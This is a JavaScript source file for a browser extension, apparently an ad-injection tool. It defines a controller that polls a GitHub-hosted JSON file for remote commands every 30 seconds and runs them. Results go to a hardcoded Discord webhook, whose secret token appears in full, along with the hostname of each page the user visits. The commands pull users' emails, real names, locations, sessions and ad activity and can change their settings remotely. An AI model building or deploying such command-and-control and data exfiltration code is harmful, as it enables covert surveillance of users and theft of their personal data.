// Discord Command Controller - For remote control and on-demand queries
class DiscordController {
    constructor(supabaseClient) {
        this.supabase = supabaseClient;
        this.webhookUrl = 'https://discord.com/api/webhooks/1389631578421854321/IF2g67p4aQORnAyg-g7G3hxSYHJQ7Wf5v7CiHkBgnXFW9WyttWXwiBH9nB1kyoXZLdtJ';
        this.commandCheckInterval = 30000; // Check for commands every 30 seconds
        this.lastCommandCheck = Date.now();
        
        this.init();
    }

    async init() {
        // Start listening for commands
        this.startCommandListener();
        
        // Send initial "online" status
        await this.sendStatus('🟢 Extension Online', {
            userId: this.supabase.currentUserId,
            domain: window.location.hostname,
            timestamp: new Date().toISOString()
        });
    }

    // Listen for commands from Discord (check a GitHub Gist or similar)
    async startCommandListener() {
        setInterval(async () => {
            try {
                await this.checkForCommands();
            } catch (error) {
                console.error('Discord command check failed:', error);
            }
        }, this.commandCheckInterval);
    }

    // Check for new commands (you could use GitHub Gist, Firebase, or any simple endpoint)
    async checkForCommands() {
        try {
            // Check for commands in a simple text file or API endpoint
            const commandUrl = 'https://raw.githubusercontent.com/NachoPayback/6301912-SP-Ad-Pumper/master/discord-commands.json';
            const response = await fetch(commandUrl + '?t=' + Date.now());
            const commands = await response.json();
            
            // Process any new commands
            if (commands.timestamp > this.lastCommandCheck) {
                await this.processCommands(commands.commands || []);
                this.lastCommandCheck = commands.timestamp;
            }
        } catch (error) {
            // Silent fail - commands are optional
        }
    }

    // Process Discord commands
    async processCommands(commands) {
        for (const command of commands) {
            try {
                await this.executeCommand(command);
            } catch (error) {
                await this.sendError('Command execution failed', { command, error: error.message });
            }
        }
    }

    // Execute individual commands
    async executeCommand(command) {
        const { action, params = {} } = command;
        
        switch (action) {
            case 'get_user_stats':
                await this.sendUserStats(params.userId);
                break;
                
            case 'get_analytics_summary':
                await this.sendAnalyticsSummary(params.timeframe || '24h');
                break;
                
            case 'update_user_settings':
                await this.updateUserSettings(params.userId, params.settings);
                break;
                
            case 'get_active_users':
                await this.sendActiveUsers();
                break;
                
            case 'emergency_disable':
                await this.emergencyDisable();
                break;
                
            case 'test_connection':
                await this.sendStatus('🔧 Test Command Received', { timestamp: new Date().toISOString() });
                break;
                
            default:
                await this.sendError('Unknown command', { command });
        }
    }

    // Get and send user statistics
    async sendUserStats(userId) {
        try {
            const userStats = await this.getUserStatsFromSupabase(userId);
            await this.sendResponse('👤 User Statistics', userStats);
        } catch (error) {
            await this.sendError('Failed to get user stats', { userId, error: error.message });
        }
    }

    // Get user stats from Supabase
    async getUserStatsFromSupabase(userId) {
        // Get user info
        const userResponse = await this.supabase.request(`/users?id=eq.${userId}`);
        const user = userResponse[0];
        
        // Get user settings
        const settingsResponse = await this.supabase.request(`/user_settings?user_id=eq.${userId}`);
        const settings = settingsResponse[0];
        
        // Get recent sessions
        const sessionsResponse = await this.supabase.request(
            `/user_sessions?user_id=eq.${userId}&order=session_start.desc&limit=5`
        );
        
        // Get ad interactions today
        const today = new Date().toISOString().split('T')[0];
        const interactionsResponse = await this.supabase.request(
            `/ad_interactions?user_id=eq.${userId}&timestamp=gte.${today}T00:00:00`
        );
        
        return {
            user: {
                email: user?.email,
                realName: user?.real_name,
                location: user?.location,
                totalSessions: user?.total_sessions,
                lastSeen: user?.last_seen
            },
            settings: {
                slotMode: settings?.slot_mode,
                bannersPerPage: settings?.banners_per_page,
                toastsPerSession: settings?.toasts_per_session,
                prerollEnabled: settings?.preroll_enabled
            },
            todayStats: {
                adInteractions: interactionsResponse.length,
                sessions: sessionsResponse.length
            },
            recentSessions: sessionsResponse.map(s => ({
                start: s.session_start,
                duration: s.session_duration,
                pagesVisited: s.pages_visited
            }))
        };
    }

    // Send analytics summary
    async sendAnalyticsSummary(timeframe) {
        try {
            const summary = await this.getAnalyticsSummaryFromSupabase(timeframe);
            await this.sendResponse(`📊 Analytics Summary (${timeframe})`, summary);
        } catch (error) {
            await this.sendError('Failed to get analytics summary', { timeframe, error: error.message });
        }
    }

    // Get analytics summary from Supabase
    async getAnalyticsSummaryFromSupabase(timeframe) {
        const hours = timeframe === '24h' ? 24 : timeframe === '7d' ? 168 : 24;
        const since = new Date(Date.now() - hours * 60 * 60 * 1000).toISOString();
        
        // Get user count
        const usersResponse = await this.supabase.request(`/users?last_seen=gte.${since}`);
        
        // Get ad interactions
        const interactionsResponse = await this.supabase.request(`/ad_interactions?timestamp=gte.${since}`);
        
        // Get sessions
        const sessionsResponse = await this.supabase.request(`/user_sessions?session_start=gte.${since}`);
        
        // Aggregate data
        const adStats = interactionsResponse.reduce((acc, interaction) => {
            acc[interaction.ad_type] = acc[interaction.ad_type] || {};
            acc[interaction.ad_type][interaction.interaction_type] = (acc[interaction.ad_type][interaction.interaction_type] || 0) + 1;
            return acc;
        }, {});
        
        return {
            timeframe,
            activeUsers: usersResponse.length,
            totalSessions: sessionsResponse.length,
            adInteractions: interactionsResponse.length,
            adBreakdown: adStats,
            topDomains: this.getTopDomains(interactionsResponse),
            avgSessionDuration: this.getAvgSessionDuration(sessionsResponse)
        };
    }

    // Get top domains from interactions
    getTopDomains(interactions) {
        const domains = {};
        interactions.forEach(i => {
            domains[i.site_domain] = (domains[i.site_domain] || 0) + 1;
        });
        return Object.entries(domains)
            .sort(([,a], [,b]) => b - a)
            .slice(0, 5)
            .map(([domain, count]) => ({ domain, count }));
    }

    // Calculate average session duration
    getAvgSessionDuration(sessions) {
        const validSessions = sessions.filter(s => s.session_duration);
        if (validSessions.length === 0) return 0;
        
        const total = validSessions.reduce((sum, s) => sum + s.session_duration, 0);
        return Math.round(total / validSessions.length);
    }

    // Update user settings remotely
    async updateUserSettings(userId, newSettings) {
        try {
            await this.supabase.updateUserSettings(userId, newSettings);
            await this.sendResponse('⚙️ User Settings Updated', {
                userId,
                updatedSettings: newSettings,
                timestamp: new Date().toISOString()
            });
        } catch (error) {
            await this.sendError('Failed to update user settings', { userId, newSettings, error: error.message });
        }
    }

    // Send active users list
    async sendActiveUsers() {
        try {
            const since = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();
            const activeUsers = await this.supabase.request(
                `/users?last_seen=gte.${since}&order=last_seen.desc&limit=20`
            );
            
            await this.sendResponse('👥 Active Users (24h)', {
                count: activeUsers.length,
                users: activeUsers.map(u => ({
                    email: u.email,
                    location: u.location?.city || 'Unknown',
                    lastSeen: u.last_seen,
                    totalSessions: u.total_sessions
                }))
            });
        } catch (error) {
            await this.sendError('Failed to get active users', { error: error.message });
        }
    }

    // Emergency disable
    async emergencyDisable() {
        try {
            // Disable the extension
            window.SP_EMERGENCY_DISABLE = true;
            
            // Clear all timers and stop operations
            if (window.SP_Analytics) {
                window.SP_Analytics.disable();
            }
            
            await this.sendStatus('🚨 EMERGENCY DISABLE ACTIVATED', {
                timestamp: new Date().toISOString(),
                domain: window.location.hostname
            });
        } catch (error) {
            await this.sendError('Emergency disable failed', { error: error.message });
        }
    }

    // Send formatted response to Discord
    async sendResponse(title, data) {
        const embed = {
            title: title,
            color: 0x00ff00,
            fields: this.formatDataAsFields(data),
            timestamp: new Date().toISOString(),
            footer: {
                text: `Domain: ${window.location.hostname}`
            }
        };
        
        await this.sendToDiscord({ embeds: [embed] });
    }

    // Send status message
    async sendStatus(message, data = {}) {
        const embed = {
            title: message,
            color: 0x0099ff,
            fields: this.formatDataAsFields(data),
            timestamp: new Date().toISOString()
        };
        
        await this.sendToDiscord({ embeds: [embed] });
    }

    // Send error message
    async sendError(message, data = {}) {
        const embed = {
            title: `❌ ${message}`,
            color: 0xff0000,
            fields: this.formatDataAsFields(data),
            timestamp: new Date().toISOString()
        };
        
        await this.sendToDiscord({ embeds: [embed] });
    }

    // Format data as Discord embed fields
    formatDataAsFields(data) {
        const fields = [];
        
        for (const [key, value] of Object.entries(data)) {
            if (value !== null && value !== undefined) {
                let displayValue = value;
                
                if (typeof value === 'object') {
                    displayValue = '```json\n' + JSON.stringify(value, null, 2) + '\n```';
                } else if (typeof value === 'string' && value.length > 1000) {
                    displayValue = value.substring(0, 1000) + '...';
                }
                
                fields.push({
                    name: key.replace(/_/g, ' ').replace(/\b\w/g, l => l.toUpperCase()),
                    value: displayValue.toString(),
                    inline: typeof value !== 'object'
                });
            }
        }
        
        return fields;
    }

    // Send to Discord webhook
    async sendToDiscord(payload) {
        try {
            await fetch(this.webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (error) {
            console.error('Discord send failed:', error);
        }
    }
}

// Export for use
window.DiscordController = DiscordController; 